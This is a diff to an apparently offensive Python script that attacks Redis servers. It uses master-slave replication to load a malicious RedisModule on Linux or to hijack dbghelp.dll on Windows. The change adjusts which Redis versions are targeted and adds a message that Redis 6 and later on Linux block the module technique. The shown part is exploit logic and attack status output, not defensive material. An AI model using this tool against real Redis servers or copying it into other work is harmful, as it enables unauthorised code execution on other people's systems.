@@ -264,18 +264,28 @@ def run(rhost, rport, lhost, lport):
         print("[*] Redis arch_bits: {}".format(redis_arch_bits))
 
         # Depending on the Redis version and the system, determine the file transferred in the master-slave replication 
-        if 'Linux' in redis_os and int(redis_version[0])>=4:
+        if 'Linux' in redis_os and int(redis_version[0]) in [4,5]:
             print("[√] Can use master-slave replication to load the RedisModule to attack the redis")
             if os.path.exists(linuxfilename) == False:
                 print("\033[1;31;m[-]\033[0m Where is your module(linux)? ")
                 exit(0)
             expfile = os.path.basename(linuxfilename)
-        elif 'Windows' in redis_os:
+        elif 'Linux' in redis_os and int(redis_version[0]) >=6 :
+            print("\033[1;31;40m[!]\033[0m Starting from Redis 6, "\
+                "Redis will detect the permissions of module files."\
+                " If there are no executable permissions, "\
+                "the load is prohibited. "\
+                "The permissions of files written through Redis master-slave replication are `0644`, "\
+                "so it is impossible to attack modules through master-slave replication, "\
+                "at least in Linux.")
+            print("[#] Please use other tools to attack the redis")
+            exit(0)
+        elif 'Windows' in redis_os and float('.'.join(redis_version.split('.')[0:2])) >=2.8 :
             print("[√] Can use master-slave replication to hijack dbghelp.dll to attack the redis")
             if os.path.exists(winfilename[0]) == False:
                 print("\033[1;31;40m[-]\033[0m Where is your dbghelp.dll? ")
                 exit(0)
-            if int(redis_version[0])>=4:
+            if int(redis_version[0]) >=4 :
                 print("[√] Can use master-slave replication to load the RedisModule to attack the redis")
                 if os.path.exists(winfilename[1]) == False:
                     print("\033[1;31;40m[-]\033[0m Where is your module(win)? ")
